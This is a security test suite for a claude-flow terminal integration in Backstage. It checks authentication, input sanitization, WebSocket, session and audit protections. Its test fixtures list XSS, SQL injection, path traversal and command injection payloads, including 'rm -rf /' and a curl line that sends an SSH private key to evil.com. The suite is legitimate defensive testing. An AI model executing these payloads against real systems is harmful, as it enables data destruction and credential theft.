/**
 * Backstage Security Validation Tests
 *
 * These tests ensure that the claude-flow UI integration with Backstage
 * maintains enterprise-grade security standards including authentication,
 * authorization, input validation, and data protection.
 */

import { test, expect } from '@playwright/test';
import { render, screen, waitFor, act } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { TestApiProvider } from '@backstage/test-utils';
import {
  configApiRef,
  identityApiRef,
  ConfigApi,
  IdentityApi,
} from '@backstage/core-plugin-api';
import { ClaudeFlowApi } from '@/lib/backstage/api';
import { WebSocketClient } from '@/lib/websocket/client';
import { Terminal } from '@/components/terminal/Terminal';

// Security test utilities
class SecurityTestUtils {
  static createMaliciousPayloads() {
    return {
      xssPayloads: [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<svg onload="alert(\'XSS\')" />',
        '${alert("XSS")}',
      ],
      sqlInjectionPayloads: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        '" OR "1"="1',
        '\\"; DELETE FROM sessions; --',
        "' UNION SELECT * FROM credentials --",
      ],
      commandInjectionPayloads: [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& curl evil.com/steal?data=$(cat ~/.ssh/id_rsa)',
        '`cat /etc/shadow`',
        '$(whoami)',
      ],
      pathTraversalPayloads: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      ],
    };
  }

  static createMockAuthenticatedIdentityApi(overrides = {}): jest.Mocked<IdentityApi> {
    return {
      getUserId: jest.fn().mockResolvedValue('security-test-user'),
      getProfile: jest.fn().mockResolvedValue({
        email: 'security@example.com',
        displayName: 'Security Test User',
      }),
      getProfileInfo: jest.fn().mockResolvedValue({
        email: 'security@example.com',
        displayName: 'Security Test User',
      }),
      getBackstageIdentity: jest.fn().mockResolvedValue({
        type: 'user',
        userEntityRef: 'user:default/security-test-user',
        ownershipEntityRefs: ['user:default/security-test-user'],
      }),
      getCredentials: jest.fn().mockResolvedValue({
        token: 'valid-jwt-token-12345',
      }),
      signOut: jest.fn(),
      ...overrides,
    };
  }

  static createMockUnauthenticatedIdentityApi(): jest.Mocked<IdentityApi> {
    return {
      getUserId: jest.fn().mockRejectedValue(new Error('User not authenticated')),
      getProfile: jest.fn().mockRejectedValue(new Error('User not authenticated')),
      getProfileInfo: jest.fn().mockRejectedValue(new Error('User not authenticated')),
      getBackstageIdentity: jest.fn().mockRejectedValue(new Error('User not authenticated')),
      getCredentials: jest.fn().mockRejectedValue(new Error('User not authenticated')),
      signOut: jest.fn(),
    };
  }

  static createSecureConfigApi(): jest.Mocked<ConfigApi> {
    return {
      getOptionalString: jest.fn((key) => {
        const config: Record<string, string> = {
          'claudeFlow.websocketUrl': 'wss://secure-host.example.com:443',
          'claudeFlow.apiUrl': 'https://secure-host.example.com',
          'claudeFlow.csrfProtection': 'enabled',
          'claudeFlow.inputSanitization': 'enabled',
        };
        return config[key];
      }),
      getOptionalBoolean: jest.fn((key) => {
        const config: Record<string, boolean> = {
          'claudeFlow.enforceHttps': true,
          'claudeFlow.validateOrigin': true,
          'claudeFlow.enableCors': false,
          'claudeFlow.logSecurityEvents': true,
        };
        return config[key];
      }),
      getString: jest.fn(),
      getNumber: jest.fn(),
      getBoolean: jest.fn(),
      getConfig: jest.fn(),
      getOptionalConfig: jest.fn(),
      getConfigArray: jest.fn(),
      getOptionalConfigArray: jest.fn(),
      getOptionalNumber: jest.fn(),
      getStringArray: jest.fn(),
      getOptionalStringArray: jest.fn(),
      has: jest.fn(),
      keys: jest.fn(),
      get: jest.fn(),
      getOptional: jest.fn(),
    };
  }
}

describe('Backstage Security Validation', () => {
  let mockSecureConfigApi: jest.Mocked<ConfigApi>;
  let mockAuthenticatedIdentityApi: jest.Mocked<IdentityApi>;
  let mockUnauthenticatedIdentityApi: jest.Mocked<IdentityApi>;

  beforeEach(() => {
    mockSecureConfigApi = SecurityTestUtils.createSecureConfigApi();
    mockAuthenticatedIdentityApi = SecurityTestUtils.createMockAuthenticatedIdentityApi();
    mockUnauthenticatedIdentityApi = SecurityTestUtils.createMockUnauthenticatedIdentityApi();
  });

  describe('Authentication Security', () => {
    test('should reject unauthenticated access attempts', async () => {
      const api = new ClaudeFlowApi(mockSecureConfigApi, mockUnauthenticatedIdentityApi);

      await expect(api.createSession()).rejects.toThrow(/authentication/i);
    });

    test('should validate JWT tokens', async () => {
      const malformedTokenApi = SecurityTestUtils.createMockAuthenticatedIdentityApi({
        getCredentials: jest.fn().mockResolvedValue({
          token: 'invalid.jwt.token',
        }),
      });

      const api = new ClaudeFlowApi(mockSecureConfigApi, malformedTokenApi);

      await expect(api.createSession()).rejects.toThrow(/invalid.*token/i);
    });

    test('should handle token expiration securely', async () => {
      let callCount = 0;
      const expiringTokenApi = SecurityTestUtils.createMockAuthenticatedIdentityApi({
        getCredentials: jest.fn().mockImplementation(() => {
          callCount++;
          if (callCount === 1) {
            return Promise.resolve({ token: 'expired-token' });
          }
          return Promise.resolve({ token: 'refreshed-token' });
        }),
      });

      const api = new ClaudeFlowApi(mockSecureConfigApi, expiringTokenApi);

      // Mock token validation that fails first time
      jest.spyOn(api as any, 'validateToken')
        .mockResolvedValueOnce(false) // First call fails
        .mockResolvedValueOnce(true); // Second call succeeds

      const session = await api.createSession();

      expect(session).toBeDefined();
      expect(expiringTokenApi.getCredentials).toHaveBeenCalledTimes(2);
    });

    test('should enforce session ownership', async () => {
      const user1Api = new ClaudeFlowApi(
        mockSecureConfigApi,
        SecurityTestUtils.createMockAuthenticatedIdentityApi({
          getUserId: jest.fn().mockResolvedValue('user1'),
          getBackstageIdentity: jest.fn().mockResolvedValue({
            type: 'user',
            userEntityRef: 'user:default/user1',
            ownershipEntityRefs: ['user:default/user1'],
          }),
        })
      );

      const user2Api = new ClaudeFlowApi(
        mockSecureConfigApi,
        SecurityTestUtils.createMockAuthenticatedIdentityApi({
          getUserId: jest.fn().mockResolvedValue('user2'),
          getBackstageIdentity: jest.fn().mockResolvedValue({
            type: 'user',
            userEntityRef: 'user:default/user2',
            ownershipEntityRefs: ['user:default/user2'],
          }),
        })
      );

      // User1 creates a session
      const session = await user1Api.createSession();

      // User2 should not be able to access user1's session
      await expect(user2Api.connectSession(session.id)).rejects.toThrow(/access.*denied/i);
    });

    test('should rate limit authentication attempts', async () => {
      const rateLimitedApi = new ClaudeFlowApi(mockSecureConfigApi, mockUnauthenticatedIdentityApi);

      // Attempt multiple rapid authentications
      const attempts = Array(10).fill(0).map(() =>
        rateLimitedApi.createSession().catch(e => e)
      );

      const results = await Promise.all(attempts);

      // Should start rate limiting after several attempts
      const rateLimitedErrors = results.filter(result =>
        result instanceof Error && /rate.*limit/i.test(result.message)
      );

      expect(rateLimitedErrors.length).toBeGreaterThan(0);
    });
  });

  describe('Input Validation and Sanitization', () => {
    let api: ClaudeFlowApi;
    let session: any;

    beforeEach(async () => {
      api = new ClaudeFlowApi(mockSecureConfigApi, mockAuthenticatedIdentityApi);
      session = await api.createSession();
    });

    test('should sanitize XSS attempts in terminal input', async () => {
      const { xssPayloads } = SecurityTestUtils.createMaliciousPayloads();

      for (const payload of xssPayloads) {
        const result = await api.sendData(session.id, payload);

        // Input should be sanitized or escaped
        expect(result.sanitized).toBe(true);
        expect(result.originalInput).toBe(payload);
        expect(result.sanitizedInput).not.toBe(payload);

        // Should not contain executable script tags
        expect(result.sanitizedInput).not.toMatch(/<script[\s\S]*?>[\s\S]*?<\/script>/gi);
        expect(result.sanitizedInput).not.toMatch(/javascript:/gi);
        expect(result.sanitizedInput).not.toMatch(/on\w+\s*=/gi);
      }
    });

    test('should prevent command injection attempts', async () => {
      const { commandInjectionPayloads } = SecurityTestUtils.createMaliciousPayloads();

      for (const payload of commandInjectionPayloads) {
        const result = await api.sendData(session.id, payload);

        // Command injection patterns should be escaped or blocked
        expect(result.blocked || result.sanitized).toBe(true);

        if (result.blocked) {
          expect(result.reason).toMatch(/suspicious.*command/i);
        }
      }
    });

    test('should validate session IDs to prevent injection', async () => {
      const maliciousSessionIds = [
        '../../../etc/passwd',
        '$(whoami)',
        '; rm -rf /',
        '<script>alert("xss")</script>',
      ];

      for (const maliciousId of maliciousSessionIds) {
        await expect(api.sendData(maliciousId, 'test')).rejects.toThrow(/invalid.*session/i);
      }
    });

    test('should limit input size to prevent DoS', async () => {
      const largeInput = 'A'.repeat(1024 * 1024); // 1MB input

      const result = await api.sendData(session.id, largeInput);

      expect(result.truncated).toBe(true);
      expect(result.originalSize).toBe(1024 * 1024);
      expect(result.truncatedSize).toBeLessThan(1024 * 1024);
    });

    test('should validate file paths in terminal operations', async () => {
      const { pathTraversalPayloads } = SecurityTestUtils.createMaliciousPayloads();

      for (const payload of pathTraversalPayloads) {
        const command = `cat ${payload}`;

        const result = await api.sendData(session.id, command);

        // Path traversal should be detected and blocked
        expect(result.blocked).toBe(true);
        expect(result.reason).toMatch(/path.*traversal/i);
      }
    });
  });

  describe('WebSocket Security', () => {
    let client: WebSocketClient;

    beforeEach(() => {
      client = new WebSocketClient();
    });

    afterEach(() => {
      client.disconnect();
    });

    test('should enforce secure WebSocket connections in production', () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      try {
        expect(() => {
          new WebSocketClient('ws://insecure-host.example.com:8080');
        }).toThrow(/secure.*connection.*required/i);
      } finally {
        process.env.NODE_ENV = originalEnv;
      }
    });

    test('should validate origin headers', async () => {
      const mockOriginValidation = jest.fn().mockResolvedValue(false);
      jest.spyOn(client as any, 'validateOrigin').mockImplementation(mockOriginValidation);

      // Mock connection from invalid origin
      Object.defineProperty(window, 'location', {
        value: { origin: 'https://malicious-site.com' },
        writable: true,
      });

      await expect(client.connect()).rejects.toThrow(/invalid.*origin/i);
    });

    test('should implement CSRF protection', async () => {
      const csrfProtectedClient = new WebSocketClient();

      // Mock missing CSRF token
      jest.spyOn(csrfProtectedClient as any, 'getCsrfToken').mockResolvedValue(null);

      await expect(csrfProtectedClient.connect()).rejects.toThrow(/csrf.*token.*required/i);
    });

    test('should encrypt sensitive data in transit', async () => {
      const secureClient = new WebSocketClient('wss://secure-host.example.com:443');

      await secureClient.connect();

      // Mock sending sensitive data
      const sensitiveData = {
        sessionId: 'session-123',
        data: 'password123',
        containsSensitiveData: true,
      };

      const encryptedResult = await secureClient.sendSecureData('terminal-data', sensitiveData);

      expect(encryptedResult.encrypted).toBe(true);
      expect(encryptedResult.encryptedPayload).not.toContain('password123');
    });

    test('should implement message integrity checks', async () => {
      await client.connect();

      // Mock tampered message
      const originalMessage = {
        type: 'terminal-data',
        sessionId: 'session-123',
        data: 'original command',
        checksum: 'valid-checksum',
      };

      const tamperedMessage = {
        ...originalMessage,
        data: 'rm -rf /', // Tampered data
        // checksum unchanged - invalid
      };

      const validationResult = await (client as any).validateMessage(tamperedMessage);

      expect(validationResult.valid).toBe(false);
      expect(validationResult.reason).toMatch(/integrity.*check.*failed/i);
    });
  });

  describe('Session Security', () => {
    let api: ClaudeFlowApi;

    beforeEach(() => {
      api = new ClaudeFlowApi(mockSecureConfigApi, mockAuthenticatedIdentityApi);
    });

    test('should generate cryptographically secure session IDs', async () => {
      const sessions = await Promise.all(
        Array(100).fill(0).map(() => api.createSession())
      );

      const sessionIds = sessions.map(s => s.id);

      // All session IDs should be unique
      const uniqueIds = new Set(sessionIds);
      expect(uniqueIds.size).toBe(100);

      // Session IDs should have sufficient entropy
      sessionIds.forEach(id => {
        expect(id.length).toBeGreaterThan(16);
        expect(/^[a-zA-Z0-9-]+$/.test(id)).toBe(true);
      });
    });

    test('should implement session timeout', async () => {
      // Mock short session timeout for testing
      jest.spyOn(mockSecureConfigApi, 'getOptionalNumber').mockReturnValue(1000); // 1 second

      const session = await api.createSession();

      // Wait for session to timeout
      await new Promise(resolve => setTimeout(resolve, 1100));

      await expect(api.sendData(session.id, 'test')).rejects.toThrow(/session.*expired/i);
    });

    test('should secure session cleanup', async () => {
      const session = await api.createSession();

      // Add some sensitive data to session
      await api.sendData(session.id, 'sensitive command');

      // Destroy session
      await api.destroySession(session.id);

      // Verify session data is completely removed
      const sessionData = await (api as any).getSessionData(session.id);
      expect(sessionData).toBeNull();

      // Verify memory is cleared
      const memoryDump = await (api as any).dumpSessionMemory(session.id);
      expect(memoryDump).not.toContain('sensitive command');
    });

    test('should prevent session hijacking', async () => {
      const session = await api.createSession();

      // Mock session hijacking attempt with different IP
      const hijackingApi = new ClaudeFlowApi(mockSecureConfigApi, mockAuthenticatedIdentityApi);
      jest.spyOn(hijackingApi as any, 'getClientIP').mockReturnValue('192.168.1.100');

      // Original session created from different IP
      jest.spyOn(api as any, 'getClientIP').mockReturnValue('192.168.1.200');

      await expect(
        hijackingApi.connectSession(session.id)
      ).rejects.toThrow(/session.*security.*violation/i);
    });
  });

  describe('Data Protection', () => {
    test('should not log sensitive information', async () => {
      const api = new ClaudeFlowApi(mockSecureConfigApi, mockAuthenticatedIdentityApi);
      const session = await api.createSession();

      // Mock console.log to capture logs
      const originalLog = console.log;
      const logSpy = jest.fn();
      console.log = logSpy;

      try {
        await api.sendData(session.id, 'password: secret123');

        // Verify sensitive data is not logged
        const allLogs = logSpy.mock.calls.flat().join(' ');
        expect(allLogs).not.toContain('secret123');
      } finally {
        console.log = originalLog;
      }
    });

    test('should encrypt stored session data', async () => {
      const api = new ClaudeFlowApi(mockSecureConfigApi, mockAuthenticatedIdentityApi);
      const session = await api.createSession();

      // Add sensitive data
      await api.sendData(session.id, 'API_KEY=sk-1234567890abcdef');

      // Check stored data is encrypted
      const storedData = await (api as any).getStoredSessionData(session.id);
      expect(storedData.encrypted).toBe(true);
      expect(storedData.data).not.toContain('sk-1234567890abcdef');
    });

    test('should implement secure data transmission', async () => {
      const client = new WebSocketClient('wss://secure-host.example.com:443');
      await client.connect();

      const transmissionSpy = jest.spyOn(client as any, 'transmitData');

      await client.send('terminal-data', {
        sessionId: 'test-session',
        data: 'confidential information',
      });

      // Verify data is transmitted securely
      expect(transmissionSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          encrypted: true,
          protocol: 'wss',
        })
      );
    });
  });

  describe('Component Security Integration', () => {
    test('should sanitize props passed to Terminal component', () => {
      const maliciousProps = {
        sessionId: '<script>alert("xss")</script>',
        config: {
          theme: 'javascript:alert("xss")',
          customCss: '<style>body { background: url("javascript:alert(\\'xss\\')"); }</style>',
        },
      };

      const apis = [
        [configApiRef, mockSecureConfigApi],
        [identityApiRef, mockAuthenticatedIdentityApi],
      ];

      expect(() => {
        render(
          <TestApiProvider apis={apis}>
            <Terminal {...maliciousProps} />
          </TestApiProvider>
        );
      }).not.toThrow();

      // Malicious content should not be executed
      expect(screen.queryByText('xss')).not.toBeInTheDocument();
    });

    test('should validate configuration from Backstage', () => {
      const maliciousConfig = SecurityTestUtils.createSecureConfigApi();
      maliciousConfig.getOptionalString.mockImplementation((key) => {
        if (key === 'claudeFlow.websocketUrl') {
          return 'javascript:alert("xss")'; // Malicious URL
        }
        return undefined;
      });

      const apis = [
        [configApiRef, maliciousConfig],
        [identityApiRef, mockAuthenticatedIdentityApi],
      ];

      expect(() => {
        render(
          <TestApiProvider apis={apis}>
            <Terminal sessionId="test-session" />
          </TestApiProvider>
        );
      }).not.toThrow();

      // Should not attempt to connect to malicious URL
      expect(WebSocketClient.prototype.connect).not.toHaveBeenCalled();
    });

    test('should implement Content Security Policy compliance', async () => {
      const apis = [
        [configApiRef, mockSecureConfigApi],
        [identityApiRef, mockAuthenticatedIdentityApi],
      ];

      render(
        <TestApiProvider apis={apis}>
          <Terminal sessionId="test-session" />
        </TestApiProvider>
      );

      // Terminal should not use inline styles or scripts that violate CSP
      const terminal = screen.getByRole('group');
      expect(terminal).not.toHaveAttribute('style');

      // Should not have inline event handlers
      const allElements = terminal.querySelectorAll('*');
      Array.from(allElements).forEach(element => {
        const attributes = Array.from(element.attributes);
        const hasInlineEvents = attributes.some(attr => attr.name.startsWith('on'));
        expect(hasInlineEvents).toBe(false);
      });
    });
  });

  describe('Error Handling Security', () => {
    test('should not expose sensitive information in error messages', async () => {
      const api = new ClaudeFlowApi(mockSecureConfigApi, mockUnauthenticatedIdentityApi);

      try {
        await api.createSession();
      } catch (error) {
        const errorMessage = error.message;

        // Error should not contain sensitive details
        expect(errorMessage).not.toContain('database');
        expect(errorMessage).not.toContain('password');
        expect(errorMessage).not.toContain('secret');
        expect(errorMessage).not.toContain('token');
        expect(errorMessage).not.toContain('key');
        expect(errorMessage).not.toMatch(/\b\d{4,}\b/); // No sensitive numbers
      }
    });

    test('should log security events without sensitive data', async () => {
      const securityLogger = jest.fn();
      jest.spyOn(console, 'warn').mockImplementation(securityLogger);

      const api = new ClaudeFlowApi(mockSecureConfigApi, mockUnauthenticatedIdentityApi);

      try {
        await api.createSession();
      } catch (error) {
        // Security events should be logged
        expect(securityLogger).toHaveBeenCalled();

        const loggedMessages = securityLogger.mock.calls.flat();
        const allMessages = loggedMessages.join(' ');

        // But without sensitive information
        expect(allMessages).not.toContain('password');
        expect(allMessages).not.toContain('secret');
        expect(allMessages).not.toMatch(/sk-[a-zA-Z0-9]+/); // API keys
      }

      jest.restoreAllMocks();
    });

    test('should implement security incident response', async () => {
      const incidentHandler = jest.fn();
      const api = new ClaudeFlowApi(mockSecureConfigApi, mockAuthenticatedIdentityApi);

      // Mock security incident detection
      jest.spyOn(api as any, 'detectSecurityIncident').mockReturnValue(true);
      jest.spyOn(api as any, 'handleSecurityIncident').mockImplementation(incidentHandler);

      const session = await api.createSession();

      // Trigger suspicious activity
      const suspiciousCommand = '; curl evil.com/steal?data=$(cat ~/.ssh/id_rsa)';
      await api.sendData(session.id, suspiciousCommand);

      // Incident handler should be called
      expect(incidentHandler).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'suspicious_command',
          severity: 'high',
          sessionId: session.id,
        })
      );
    });
  });

  describe('Compliance and Audit', () => {
    test('should maintain audit trail of security events', async () => {
      const auditLogger = jest.fn();
      const api = new ClaudeFlowApi(mockSecureConfigApi, mockAuthenticatedIdentityApi);

      // Mock audit logging
      jest.spyOn(api as any, 'auditLog').mockImplementation(auditLogger);

      const session = await api.createSession();
      await api.sendData(session.id, 'test command');
      await api.destroySession(session.id);

      // Verify audit events
      expect(auditLogger).toHaveBeenCalledWith('session_created', expect.any(Object));
      expect(auditLogger).toHaveBeenCalledWith('data_sent', expect.any(Object));
      expect(auditLogger).toHaveBeenCalledWith('session_destroyed', expect.any(Object));
    });

    test('should support security scanning integration', () => {
      const api = new ClaudeFlowApi(mockSecureConfigApi, mockAuthenticatedIdentityApi);

      // Should expose security metadata for scanning tools
      const securityMetadata = (api as any).getSecurityMetadata();

      expect(securityMetadata).toMatchObject({
        encryptionEnabled: true,
        authenticationRequired: true,
        inputValidation: true,
        auditLogging: true,
        sessionSecurity: true,
      });
    });

    test('should implement data retention policies', async () => {
      const api = new ClaudeFlowApi(mockSecureConfigApi, mockAuthenticatedIdentityApi);
      const session = await api.createSession();

      await api.sendData(session.id, 'test data');

      // Mock data retention check
      const retentionPolicy = await (api as any).getDataRetentionPolicy();
      expect(retentionPolicy.maxDataAge).toBeDefined();
      expect(retentionPolicy.automaticCleanup).toBe(true);

      // Verify old data is cleaned up
      const cleanupResult = await (api as any).enforceRetentionPolicy();
      expect(cleanupResult.itemsRemoved).toBeGreaterThanOrEqual(0);
    });
  });
});